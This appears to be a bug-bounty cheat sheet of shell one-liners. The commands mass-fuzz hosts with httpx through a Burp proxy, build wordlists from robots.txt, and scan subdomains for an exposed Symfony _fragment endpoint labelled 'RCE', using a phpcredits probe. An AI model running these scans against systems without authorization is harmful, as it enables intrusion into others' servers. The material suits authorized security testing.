**This oneliner was created by me for personal use**

### Oneliner to fuzz all hosts with wordlist using httpx and send every request to burpsuite for more investigations:- 

```bash
httpx -l hosts -paths dir.txt -threads 100 -random-agent -x GET,POST  -tech-detect -status-code  -follow-redirects -title -http-proxy http://127.0.0.1:8080
```

### Found bug with custom wordlist from robots.txt 

```bash
httpx -l urls.txt -paths /robots.txt -silent -o robots-url.txt
```

```bash
for url in $(cat robots-url.txt);do http -b $url | grep 'Disallow' | awk -F ' ' '{print $2}' | cut -c 2- | anew robot-words.txt;done
```

### RCE ONELINER WITH HTTPX

```bash
httpx -l hosts.txt -path /_fragment?_path=_controller=phpcredits&flag=-1 -threads 100 -random-agent -x GET  -tech-detect -status-code  -follow-redirects -title -mc 200 -match-regex "PHP Credits"
```

```bash
cat pay-subdomains | sed 's/$/\/_fragment?_path=_controller=phpcredits&flag=-1/' | httpx -status-code
```

### Blind XSS Oneliner with dalfox 


